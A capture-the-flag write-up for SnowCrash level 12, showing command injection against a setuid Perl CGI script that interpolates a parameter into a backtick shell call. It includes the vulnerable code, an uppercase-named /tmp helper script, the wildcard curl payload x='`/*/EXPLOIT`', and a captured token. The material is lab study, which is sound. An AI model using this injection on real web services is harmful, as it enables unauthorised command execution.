# 1st Step
List the files in level12 user home directory will show us a pearl file owned by `flag12` user :
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$
```
The perl script is running a webserver on the port 4646, that can take two params, x and y. We can verify it with the `curl` command :
```
level12@SnowCrash:~$ curl -I 192.168.1.30:4646                                                                                                                                                                                               
HTTP/1.1 200 OK
Date: Sun, 13 Sep 2020 17:47:23 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html

level12@SnowCrash:~$
```
The program uses backticks to evaluate a shellscript "`@output = [...]`" This command is run by the script in a subshell so we have no way to see the standard output directly.  
```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];                           # get second argument
  $xx = $_[0];                           # get first argument
  $xx =~ tr/a-z/A-Z/;                    # capitalize every letter
  $xx =~ s/\s.*//;                       # delete anything following a whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # find match of first arg inside /tmp/xd, redirect errors to stdout. Here is our security breach (after that we don't care).
  foreach $line (@output) {              # for each match
      ($f, $s) = split(/:/, $line);      # get match 
      if($s =~ $nn) {                    # if match equals second argument
          return 1;                      # return true
      }
  }
  return 0;                              # else return false
}

                                         # print ".." if first arg is true / "." otherwise ¯\(°_o)/¯
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```  
As we can see in the comments above, the regex will capitalize the first argument (x) and delete anything after a space so we can't directly write x="`getflag>/tmp/token`" which would be translated as x="`GETFLAG>/TMP/TOKEN`"  
Instead we will write a file that will get executed.  

# 2nd Step
Create an executable script which run getflag and redirects its output to a file. Name it with uppercase letters.  
Because of the first regex, we have to use a wildcard in our path `/*/[EXPLOIT_FILE]` will find every `[EXPLOIT_FILE]`.
```
level12@SnowCrash:~$ cd /tmp
level12@SnowCrash:/tmp$ vim EXPLOIT
level12@SnowCrash:/tmp$ chmod 777 EXPLOIT              # otherwise it can't execute getflag
level12@SnowCrash:/tmp$ cat EXPLOIT
#!/bin/sh
getflag > /tmp/flag
level12@SnowCrash:/tmp$
```
Then use curl as we want to execute a pearl script and make a http call :
```
level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
..level12@SnowCrash:~cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ su level13
Password: 
level13@SnowCrash:~$
```

Level 12 passed !